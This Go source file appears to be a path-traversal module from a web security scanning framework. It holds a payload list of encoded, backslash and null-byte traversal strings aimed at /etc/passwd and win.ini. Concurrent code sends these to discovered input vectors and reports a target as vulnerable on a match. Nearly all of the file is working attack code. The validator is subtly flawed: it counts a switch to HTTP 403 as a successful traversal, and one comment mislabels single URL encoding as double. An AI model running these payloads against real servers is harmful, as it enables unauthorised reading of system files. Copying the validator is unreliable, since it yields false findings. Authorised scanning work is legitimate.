package core

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// PathTraversalAttackResult holds the result of the PathTraversalAttack module execution.
type PathTraversalAttackResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

type baselineInfo struct {
	statusCode int
	bodySize   int
}

// PathValidator implements reflection and status/size diffing logic.
type PathValidator struct {
	Baseline baselineInfo
}

// Validate checks if the response indicates a successful path traversal.
func (v *PathValidator) Validate(resp *http.Response, body string, payload string) (bool, string) {
	// Content matching
	if strings.Contains(body, "root:x:0:0:") {
		return true, "Path traversal successful via content match (/etc/passwd) with payload: " + payload
	}
	if strings.Contains(strings.ToLower(body), "[extensions]") {
		return true, "Path traversal successful via content match (win.ini) with payload: " + payload
	}

	// Status diffing
	if v.Baseline.statusCode != http.StatusForbidden && resp.StatusCode == http.StatusForbidden {
		return true, fmt.Sprintf("Path traversal detected via status diff: baseline=%d, payload=%d (payload: %s)", v.Baseline.statusCode, resp.StatusCode, payload)
	}

	return false, ""
}

// PathTraversalAttack executes the path_traversal_attack security technique.
type PathTraversalAttack struct {
	BaseModule
	Target string
}

// NewPathTraversalAttack creates a new instance of PathTraversalAttack.
func NewPathTraversalAttack(target string) *PathTraversalAttack {
	return &PathTraversalAttack{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

// SetThreads configures the number of concurrent threads.
func (m *PathTraversalAttack) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var traversalPayloads = []string{
	// Unix
	"../../../etc/passwd",
	"../../../../../../../../etc/passwd",
	// Unix bypasses
	"..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // double URL encoded
	"....//....//....//etc/passwd",
	// Windows
	"..\\..\\..\\windows\\win.ini",
	"../../../../../../../../windows/win.ini",
	"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
	// Null byte bypasses
	"../../../etc/passwd%00",
}

func (m *PathTraversalAttack) getBaseline(ctx context.Context, u *url.URL, vectors []InputVector) map[string]baselineInfo {
	baselines := make(map[string]baselineInfo)
	for _, v := range vectors {
		// Non-existent file check
		baselinePayload := fmt.Sprintf("nonexistent_%d", time.Now().UnixNano())
		req := buildRequest(ctx, &m.BaseModule, u, v, baselinePayload)
		if req == nil {
			continue
		}

		resp, err := m.Client.Do(req)
		if err != nil {
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		baselines[v.Key] = baselineInfo{
			statusCode: resp.StatusCode,
			bodySize:   len(body),
		}
	}
	return baselines
}

func buildRequest(ctx context.Context, b *BaseModule, u *url.URL, vector InputVector, payload string) *http.Request {
	method := "GET"
	if vector.Type == VectorFormBody || vector.Type == VectorJSONBody {
		method = "POST"
	}
	req, _ := b.BuildRequestWithVector(ctx, method, u, vector, payload)
	return req
}

// Execute performs the path traversal scan.
func (m *PathTraversalAttack) Execute(ctx context.Context) ([]PathTraversalAttackResult, error) {
	var results []PathTraversalAttackResult
	var mu sync.Mutex

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return results, err
	}

	// Step 1: Discover vectors
	vectors, _ := m.DiscoverVectors(parsedURL, nil, "", nil)

	if len(vectors) == 0 {
		vectors = append(vectors, InputVector{Type: VectorPathSegment, Key: "path_append", Value: ""})
	}

	// Step 2: Implement baseline probing
	baselines := m.getBaseline(ctx, parsedURL, vectors)

	jobs := make(chan struct {
		Vector  InputVector
		Payload string
	}, len(vectors)*len(traversalPayloads))

	for _, v := range vectors {
		for _, p := range traversalPayloads {
			jobs <- struct {
				Vector  InputVector
				Payload string
			}{v, p}
		}
	}
	close(jobs)

	var wg sync.WaitGroup
	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					res := m.testVector(ctx, parsedURL, job.Vector, job.Payload, baselines[job.Vector.Key])
					if res != nil {
						mu.Lock()
						results = append(results, *res)
						mu.Unlock()
					}
				}
			}
		}()
	}
	wg.Wait()

	return results, nil
}

func (m *PathTraversalAttack) testVector(ctx context.Context, u *url.URL, vector InputVector, payload string, baseline baselineInfo) *PathTraversalAttackResult {
	var req *http.Request
	var err error
	if vector.Key == "path_append" {
		newU, parseErr := url.Parse(u.String())
		if parseErr != nil {
			return nil
		}
		newU.Path = strings.TrimRight(newU.Path, "/") + "/" + payload
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	} else {
		req = buildRequest(ctx, &m.BaseModule, u, vector, payload)
		err = nil
	}

	if err != nil || req == nil {
		return nil
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	bodyStr := string(bodyBytes)

	// Step 3: Use PathValidator
	validator := PathValidator{Baseline: baseline}
	isVulnerable, detail := validator.Validate(resp, bodyStr, payload)

	if isVulnerable {
		return &PathTraversalAttackResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: detail,
		}
	}

	return nil
}

func init() {
	RegisterModule("path_traversal_attack", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		threads := PayloadInt(payload, "threads", 5)
		onLog(fmt.Sprintf("Starting PathTraversalAttack on: %s", target))

		tester := NewPathTraversalAttack(target)
		tester.SetThreads(threads)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
